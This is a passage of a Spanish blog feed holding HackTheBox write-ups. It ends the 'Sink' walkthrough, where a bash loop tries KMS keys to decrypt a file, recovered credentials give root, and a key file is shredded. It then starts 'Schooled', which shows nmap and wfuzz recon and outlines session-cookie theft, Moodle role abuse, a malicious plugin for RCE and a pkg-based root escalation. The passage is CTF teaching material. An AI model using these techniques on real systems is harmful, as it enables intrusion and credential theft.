        # Desencriptamos el archivo servers.enc
        aws --endpoint-url=http://localhost:4566 kms decrypt --key-id &quot;$keyId&quot; --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --output text --query Plaintext --encryption-algorithm $algorithm
    done
done &amp;lt; $file_with_keys

shred -zun 10 $file_with_keys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos yyyy:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;david@sink:/dev/shm/testest$ ./valkeria.sh

[+] Llave: 0b539917-5eff-45b2-9fa1-e13f0d2c42ac:
[*] Algoritmo: SYMMETRIC_DEFAULT

An error occurred (InvalidCiphertextException) when calling the Decrypt operation: 
[*] Algoritmo: RSAES_OAEP_SHA_1

An error occurred (InvalidCiphertextException) when calling the Decrypt operation:
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_davidSH_valkeria_done.png&quot; alt=&quot;313bash_davidSH_valkeria_done&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opaaaaaaa, logramos desencriptar el archivo y ver el contenido, tenemos una cadena en &lt;code&gt;base64&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;La llave: &lt;code&gt;804125db-bdf1-465a-a058-07fc87c0fad0&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;El tipo de algoritmo: &lt;code&gt;RSAES_OAEP_SHA_256&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si intentamos decodear esa string obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_tryingdecodebase64stringwithecho.png&quot; alt=&quot;313bash_tryingdecodebase64stringwithecho&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No obtenemos nada legible, pero de una vez pens√© en que posiblemente sea data de alg√∫n archivo, entonces tomemos el resultado del decode y guard√©moslo en un archivo y veamos que tipo de archivo es:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;...
glEwRAEATgL7TAAoAAA=&quot; | base64 -d &amp;gt; result_b64
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ file result_b64 
result_b64: gzip compressed data, from Unix, original size modulo 2^32 10240
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, un archivo comprimido, descomprim√°moslo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ gzip -d result_b64
gzip: result_b64: unknown suffix -- ignored
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Jmmm, buscando en internet sobre este error, encontramos un foro donde alguien recomienda usar &lt;code&gt;zcat&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linuxquestions.org/questions/linux-software-2/gunzip-unknown-suffix-ignored-940698/&quot;&gt;Try to use &lt;strong&gt;zcat&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;¬øPero por qu√© &lt;code&gt;zcat&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;üìÅ &lt;strong&gt;&lt;em&gt;Normalmente, los archivos comprimidos con &lt;code&gt;gzip&lt;/code&gt; se pueden restaurar a su forma original con los comandos &lt;code&gt;gzip -d&lt;/code&gt; o &lt;code&gt;gunzip&lt;/code&gt;. ¬ø&lt;u&gt;Qu√© sucede si desea ver el contenido de un archivo comprimido sin descomprimirlo&lt;/u&gt;? Para este prop√≥sito, necesita la utilidad &lt;code&gt;zcat&lt;/code&gt;&lt;/em&gt;&lt;/strong&gt;. &lt;a href=&quot;https://es.linux-console.net/?p=243&quot;&gt;linux-console&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;üìÇ &lt;strong&gt;&lt;em&gt;&lt;code&gt;zcat&lt;/code&gt; will uncompress files that have the correct magic number whether they have a &lt;code&gt;.gz&lt;/code&gt; suffix or &lt;u&gt;not&lt;/u&gt;&lt;/em&gt;&lt;/strong&gt;. &lt;a href=&quot;https://www.linuxquestions.org/questions/linux-software-2/gunzip-unknown-suffix-ignored-940698/#post4657625&quot;&gt;linuxquestions.org&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Entonces, si probamos ahora con &lt;code&gt;zcat&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_zcatdecompress_done.png&quot; alt=&quot;313bash_zcatdecompress_done&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Eaaa, tenemos un archivo &lt;code&gt;.yml&lt;/code&gt;, donde en su contenido nos encontramos con unas credenciales del usuario &lt;code&gt;admin&lt;/code&gt;. Prob√©moslas contra el usuario &lt;code&gt;root&lt;/code&gt; en la m√°quina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;david@sink:/dev/shm/testest$ su root
Password: 
root@sink:/dev/shm/testest# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Somos &lt;strong&gt;roooooooooooooooooooooooooooooooooooooooot&lt;/strong&gt; (bueno, veamos si realmente lo somos):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@sink:/dev/shm/testest# cd
root@sink:~# ls
automation  desync  docker-compose.yml  root.txt  snap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;S√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç somos administradores del sistemaaaaaaaaa (:&lt;/p&gt;

&lt;p&gt;Solo nos quedar√≠a ver las flags‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313flags.png&quot; alt=&quot;313flags&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;¬°Qu√© locura eh!&lt;/p&gt;

&lt;p&gt;Me gusto demasiado la m√°quina (: Lo que m√°s me dejo loco fue el &lt;code&gt;HTTP Request Smuggling&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Que bonito fue este camino. el jugar con &lt;code&gt;aws&lt;/code&gt; de esa manera, incre√≠ble. Y nada, como siempre, muchas gracias por leer (este si fue gigante)‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313google_gif_youarethebestTED.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yyyy a seguir rompiendo todo (:&lt;/p&gt;
</description>
        <pubDate>Sat, 18 Sep 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/sink</link>
        <guid isPermaLink="true">http://localhost:4000/htb/sink</guid>
        
        <category>AWS-CLI</category>
        
        <category>HTTP-request-smuggling</category>
        
        <category>cookie-hijacking</category>
        
        <category>gitea</category>
        
        <category>.enc</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Schooled</title>
        <description>&lt;p&gt;M√°quina &lt;strong&gt;FreeBSD&lt;/strong&gt; nivel medio, linda locura, nos moveremos mucho por &lt;strong&gt;Moodle&lt;/strong&gt; robando cookies, cambiando roles a los cuales no deber√≠amos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos los permisos que tenemos en el sistema con &lt;strong&gt;pkg install&lt;/strong&gt; para instalar paquetes algo peligrosos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335schooledHTB.png&quot; alt=&quot;335schooledHTB&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/114053&quot;&gt;TheCyberGeek&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Jugaremos con &lt;strong&gt;fuzzing de subdominios&lt;/strong&gt; para encontrar un servicio &lt;code&gt;moodle&lt;/code&gt; el cual esta infestado de problemas :P&lt;/p&gt;

&lt;p&gt;Nos aprovecharemos de un profesor que esta validando si tenemos una caracter√≠stica en nuestro perfil de estudiante para robarle su &lt;strong&gt;cookie de sesi√≥n&lt;/strong&gt; y convertirnos en √©l. Estando dentro del &lt;strong&gt;Moodle&lt;/strong&gt; como profesores, tendremos algunos &lt;code&gt;CVEs&lt;/code&gt; que justamente explotan acciones como ellos.&lt;/p&gt;

&lt;p&gt;Tendremos uno en el que podremos aprovechar una mala configuraci√≥n, modificaremos el rol de nuestro usuario para permitirle a otro usuario convertirse en &lt;strong&gt;manager&lt;/strong&gt; de un curso, con esto lograremos que el usuario con rol de &lt;strong&gt;manager&lt;/strong&gt; por default (&lt;strong&gt;Lianne&lt;/strong&gt;) instale &lt;u&gt;plugins&lt;/u&gt; mediante un archivo &lt;code&gt;.zip&lt;/code&gt; malicioso. Finalmente lograremos &lt;strong&gt;RCE&lt;/strong&gt; como el usuario &lt;code&gt;www&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Adentro encontraremos archivos de configuraci√≥n, entre ellos la conf de la base de datos, nos apoyaremos de &lt;code&gt;myslqshow&lt;/code&gt; y &lt;code&gt;mysqldump&lt;/code&gt; para ver el contenido de una tabla con usuarios, uno de ellos conocido en el sistema. Tendremos contrase√±as cifradas, apoy√°ndonos de &lt;code&gt;John The Ripper&lt;/code&gt; lograremos crackerlas y hacer uso de una de ellas para obtener una Shell como el usuario &lt;code&gt;jamie&lt;/code&gt; en el sistema.&lt;/p&gt;

&lt;p&gt;Enumerando los permisos que tenemos con &lt;strong&gt;jamie&lt;/strong&gt;, veremos que puede actualizar e instalar paquetes en el sistema usando &lt;code&gt;pkg install&lt;/code&gt;. Aprovecharemos esto para que mientras se esta instalando un paquete, nosotros podamos inyectar comandos en ese mismo paquete. As√≠ estar√≠amos ejecutando las instrucciones como el usuario &lt;code&gt;root&lt;/code&gt;. Obtendremos una Shell como √©l modificando el binario &lt;code&gt;/bin/bash&lt;/code&gt; d√°ndole permisos &lt;code&gt;SUID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bastante bastante real, vulns conocidas y bastante investigaci√≥n.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun d√≠a se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Camino de verdades y verdaderas mentiras.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Enumeraci√≥n de puertos con &lt;strong&gt;nmap&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Recorremos el puerto 80 pa ver que hay por ah√≠&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-moodle&quot;&gt;Encontramos el servicio &lt;strong&gt;Moodle&lt;/strong&gt; corriendo en el servidor web&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#teacher-cookie-hijacking&quot;&gt;Jugamos con un mensaje de un profesor y robamos cositas (con respeto)&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#CVE-2020-14321&quot;&gt;Divagando y explotando la versi√≥n del &lt;strong&gt;Moodle&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#movimiento-lateral-jamie&quot;&gt;Movimiento Lateral &lt;strong&gt;MySQL&lt;/strong&gt;: &lt;strong&gt;www&lt;/strong&gt; -&amp;gt; &lt;strong&gt;jamie&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Vemos que puertos est√°n abiertos con &lt;u&gt;nmap&lt;/u&gt; &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Empezamos haciendo un escaneo de puertos, as√≠ sabemos que servicios esta corriendo la m√°quina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nmap -p- --open -v 10.10.10.234 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat initScan 
# Nmap 7.80 scan initiated Sun Apr 11 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.234
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.234 ()   Status: Up
Host: 10.10.10.234 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 33060/open/tcp//mysqlx///
# Nmap done at Sun Apr 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 216.96 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, nos encontramos los servicios:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Secure_Shell&quot;&gt;SSH&lt;/a&gt;&lt;/strong&gt;: Contamos con la posibilidad de obtener una Shell de manera segura.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.techtarget.com/searchnetworking/definition/port-80&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Tenemos una p√°gina web.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;33060&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://serverfault.com/questions/1031235/what-is-the-port-33060-for-mysql-server-ports-in-addition-to-the-port-3306#answer-1031240&quot;&gt;MySQLx&lt;/a&gt;&lt;/strong&gt;.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ahora hagamos un escaneo de scripts y versiones para tener info m√°s especifica de cada puerto:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nmap -p 22,80,33060 -sC -sV 10.10.10.234 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat portScan 
# Nmap 7.80 scan initiated Sun Apr 11 25:25:25 2021 as: nmap -p 22,80,33060 -sC -sV -oN portScan 10.10.10.234
Nmap scan report for 10.10.10.234
Host is up (0.19s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.80%I=7%D=4/11%Time=60731B26%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,&quot;...&quot;);
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 78.15 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos (varias cositas que veremos despu√©s) por ahora:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSH 7.9 (FreeBSD 2020/02/14)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache httpd 2.4.46 (FreeBSD)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;33060&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MySQLx&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ahora exploremos cada servicio a ver por donde podemos vulnerar el sistema.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Dando vueltas con el puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80.png&quot; alt=&quot;335page80&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos encontramos una p√°gina web de una instituci√≥n para estudiar online, d√°ndole una vuelta nos encontramos un email y tambi√©n alusi√≥n al dominio &lt;code&gt;schooled.htb&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_footer.png&quot; alt=&quot;335page80_footer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo, guardemos el email por si algo y agreguemos ese dominio al archivo &lt;code&gt;/etc/hosts&lt;/code&gt; para que cuando hagamos peticiones hacia el dominio &lt;strong&gt;schooled.htb&lt;/strong&gt; nos resuelva hacia la IP &lt;strong&gt;10.10.10.234&lt;/strong&gt;, que quiz√°s tenga info diferente‚Ä¶&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html&quot;&gt;Info archivo &lt;strong&gt;/etc/hosts&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat /etc/hosts
...
10.10.10.234  schooled.htb
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y validando de nuevo en la web, pero en vez de escribir la IP ahora escribimos el dominio y obtenemos aparentemente el mismo resultado que antes.&lt;/p&gt;

&lt;p&gt;Enumerando nos encontramos el apartado &lt;code&gt;/teachers.html&lt;/code&gt; el cual tiene algunos nombres y roles que podemos guardar por si llegamos a encontrar alg√∫n portal o algo que podamos relacionar:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_teachers.png&quot; alt=&quot;335page80_teachers&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Jane Higgins -&amp;gt; Scientific.
Lianne Carter -&amp;gt; Manager &amp;amp; Profesora.
Manuel Phillips -&amp;gt; Profesor.
Jamie Borham -&amp;gt; Profesora.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Siguiendo, en el apartado &lt;code&gt;/contact.html&lt;/code&gt; encontramos unos campos a llenar y al enviarlos nos redirecciona a un archivo llamado &lt;code&gt;contact.php&lt;/code&gt;, pero obtenemos un error con estado &lt;strong&gt;404 Not Found&lt;/strong&gt;‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;web-moodle&quot;&gt;Encontramos el servicio &lt;u&gt;Moodle&lt;/u&gt; &lt;a href=&quot;#web-moodle&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ac√° no encontramos nada m√°s en la web, jugando con el c√≥digo fuente o con las carpetas que hay no vemos nada, as√≠ que procedamos a fuzzear un poco‚Ä¶&lt;/p&gt;

&lt;p&gt;Haciendo un fuzzing de archivos y directorio no encontramos nada, pero si fuzzeamos a ver si existe otro dominio relacionado con &lt;code&gt;schooled.htb&lt;/code&gt; el cual responda a la IP &lt;strong&gt;10.10.10.234&lt;/strong&gt; tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.234 -H 'Host: FUZZ.schooled.htb'
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000022:   200        461 L    1555 W     20750 Ch    &quot;pop3&quot;
000000001:   200        461 L    1555 W     20750 Ch    &quot;www&quot;
000000003:   200        461 L    1555 W     20750 Ch    &quot;ftp&quot;
000000007:   200        461 L    1555 W     20750 Ch    &quot;webdisk&quot;
000000015:   200        461 L    1555 W     20750 Ch    &quot;ns&quot;
000000023:   200        461 L    1555 W     20750 Ch    &quot;forum&quot;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos muchos, pero probablemente sean falsos positivos, as√≠ que filtremos para que nos quite todos los que tengan como numero total de letras &lt;strong&gt;1555&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ wfuzz -c --hc=404 --hw=1555 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.234 -H 'Host: FUZZ.schooled.htb'
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000162:   200        1 L      5 W        84 Ch       &quot;moodle&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, aparentemente tenemos un nuevo dominio a probar, pues agregu√©moslo junto a &lt;strong&gt;schooled.htb&lt;/strong&gt; al archivo &lt;code&gt;/etc/hosts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat /etc/hosts
...
10.10.10.234  schooled.htb moodle.schooled.htb
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y validando en la web nos encontramos con:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle.png&quot; alt=&quot;335page80_moodle&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nice, tenemos un servicio &lt;code&gt;moodle&lt;/code&gt;, que seg√∫n &lt;a href=&quot;https://es.wikipedia.org/wiki/Moodle&quot;&gt;Wikipedia&lt;/a&gt; es:&lt;/p&gt;

&lt;p&gt;üéì &lt;strong&gt;&lt;em&gt;Herramienta de gesti√≥n de aprendizaje (LMS), o m√°s concretamente de &lt;u&gt;Learning Content Management&lt;/u&gt; (LCMS), de distribuci√≥n libre, escrita en PHP.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://moodle.org/?lang=es&quot;&gt;Web Oficial de Moodle&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si intentamos ver cualquier recurso nos pide un ingreso por medio de credenciales‚Ä¶ (Probar contrase√±as por default y con los profesores encontrados no nos dio resultado).&lt;/p&gt;

&lt;p&gt;Pero tambi√©n podemos ingresar como invitado o crearnos una cuenta, probando inicialmente el acceso como invitado contra cualquier curso nos pide que debemos tener una cuenta:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_mathEnrol.png&quot; alt=&quot;335page80_moodle_mathEnrol&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dando vueltas por el sitio como invitado vemos varias URL‚Äôs posiblemente llamativas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
